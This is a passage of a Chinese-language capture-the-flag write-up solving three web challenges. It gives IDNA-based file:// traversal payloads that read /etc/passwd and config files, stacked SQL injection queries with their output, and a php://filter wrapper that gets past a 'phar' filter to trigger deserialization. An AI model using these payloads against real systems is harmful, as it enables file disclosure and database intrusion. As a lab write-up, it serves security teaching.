        if host == 'suctf.cc':
            return "我扌 your problem? 111"
        parts = list(urlsplit(url))
        host = parts[1]
        if host == 'suctf.cc':
            return "我扌 your problem? 222 " + host
        newhost = []
        for h in host.split('.'):
            newhost.append(h.encode('idna').decode('utf-8'))
        parts[1] = '.'.join(newhost)
        #去掉 url 中的空格
        finalUrl = urlunsplit(parts).split(' ')[0]
        host = parse.urlparse(finalUrl).hostname
        if host == 'suctf.cc':
            return urllib.request.urlopen(finalUrl).read()
        else:
            return "我扌 your problem? 333"
看到这个代码立马想到最近blackhat大会上公布的几个trick，具体链接如下
网页源码的注释上也有提示
所以我们结合上面的信息，来构造payload如下:
    url=file://suctf.c%E2%84%82/../../../etc/passwd
此处用于构造c的字符来源
经过一番fuzz，在配置文件中读到flag的路径和名称
    url=file://suctf.c%E2%84%82/../../../usr/local/nginx/conf/nginx.conf
    server {
        listen 80;
        location / {
            try_files $uri @app;
        }
        location @app {
            include uwsgi_params;
            uwsgi_pass unix:///tmp/uwsgi.sock;
        }
        location /static {
            alias /app/static;
        }
        # location /flag {
        #     alias /usr/fffffflag;
        # }
    }
最终读到flag
    url=file://suctf.c%E2%84%82/../../../usr/fffffflag
如果你的字典不够给力，fuzz不到的话，不妨试试这个
###  0x04 easy_sql
**题目描述**
**题目解答**
显示随便测了一下，发现一般会有以下四种返回结果
    1. query=1e100
    Array
    (
        [0] => 1
    )
    2.    query=0x730065006c0065006300740020004000400076006500%20%2e%2e%2e
    Too long.
    3.    query=1)%20or%20benchmark(10000000,MD5(1))#
    Nonono.
    4.    query=NULL
    Array
    (
        [0] => 
    )
可以看到字符长度是有限制的，而且过滤了一些关键词
之后fuzz测试的过程中发现是堆叠注入
    # 显示数据库
    query=1; show databases;
    # 回显
    Array
    (
        [0] => 1
    )
    Array
    (
        [0] => information_schema
    )
    Array
    (
        [0] => CTF
    )
    Array
    (
        [0] => mysql
    )
    Array
    (
        [0] => performance_schema
    )
    Array
    (
        [0] => score_mbamission
    )
    Array
    (
        [0] => score_minnesotaunited
    )
    # 回显表名
    query=1; show tables;
    Array
    (
        [0] => 1
    )
    Array
    (
        [0] => Flag
    )
    # 但是过滤了from
    query=1; select * from Flag;
    # 回显
    Nonono.
    # 这样也不行
    query=1; SET @SQL=0x73656c656374202a2066726f6d20466c61673b;PREPARE pord
所以最后解决方法是
    # 直接输出flag
    query=*,1
    # 回显
    Array
    (
        [0] => SUCTF{SUCTF_baby_sql_chall_120993n810h3}
        [1] => 1
    )
别问，问就是fuzz
###  0x05 Upload labs 2
**题目描述**
去看看你自己到底传了个啥  交flag时去掉引号
**题目解答**
题目有附件，所以是一个代码审计题目，先看最终怎么可以getflag，发现有对应的函数，在`admin.php`中
        function __destruct(){
            getFlag($this->ip, $this->port);
            //使用你自己的服务器监听一个确保可以收到消息的端口来获取flag
        }
而且还限制了必须是本地来访问这个`admin.php`文件
    if($_SERVER['REMOTE_ADDR'] == '127.0.0.1'){
        if(isset($_POST['admin'])){
所以目标很明确，就是要ssrf的点来触发这个，从而把flag发给我
但是很尴尬的是在`func.php`中的正则，过滤掉了`phar`这个关键字，所以初看，感觉点没有办法触发，但是后面经过分析正则的话，发现使用如下方式可以bypass掉这个正则过滤，进而触发phar反序列化。
    php://filter/read=convert.base64-encode/resource=phar://poc.phar
之所以想到这个phar文件，是因为这是一个上传题，而且存在一个疑似phar反序列化的触发点—`func.php`中的这几行代码
    $file_path = $_POST['url'];
    $file = new File($file_path);
    $file->getMIME();
    echo "Your file type is '$file' ";
具体来说就是`getMIME()`函数中的`finfo_open`函数
    function getMIME(){
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $this->type = finfo_file($finfo, $this->file_name);
        finfo_close($finfo);
    }